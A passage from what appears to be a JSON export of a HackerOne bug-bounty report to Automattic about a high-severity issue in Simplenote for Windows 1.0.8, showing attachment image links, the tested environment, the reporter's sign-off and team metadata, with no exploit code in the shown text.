src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/240/684/6489094751adb742749c66de1ea3375dcc5dc37a/pre_exploit.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222903Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=1878084b675228ff7660e6bb5ec56da65af59a51688af35daeae7607e6c747b8\" class=\"markdown-inline-image\"></a></p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"netplwiz_poc.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/240/685/920afb80188088455e32a4001412bf34875d5742/netplwiz_poc.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222903Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=94f514732bc72fc7be9afe2beba5ce22aa6017d328fe2bb2a7ad1f44e6986057\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/240/685/920afb80188088455e32a4001412bf34875d5742/netplwiz_poc.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222903Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=94f514732bc72fc7be9afe2beba5ce22aa6017d328fe2bb2a7ad1f44e6986057\" class=\"markdown-inline-image\"></a></p>\n\n<h2 id=\"verified-conditions\">Verified conditions</h2>\n\n<p>At the time of testing, I have successfully confirmed exploitability in the following environment:</p>\n\n<ul>\n<li>Simplenote for Windows 1.0.8</li>\n<li>Windows 10 x64 Home Edition</li>\n</ul>\n\n<p>Thanks,</p>\n\n<p>Yasin</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://automattic.com", 
+            "about": "WordPress.com, VaultPress, Akismet, Gravatar, Cloudup, WooCommerce, Polldaddy and more!", 
+            "twitter_handle": "", 
+            "name": "Automattic"
+        }, 
+        "handle": "automattic", 
+        "url": "https://hackerone.com/automattic", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/111/6b5147b71079b286c99869a85682f609f6c617c6_small.png?1396031864", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/111/23288d0462873e4b825f725d8480e850c7c47549_medium.png?1396031864"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 111, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
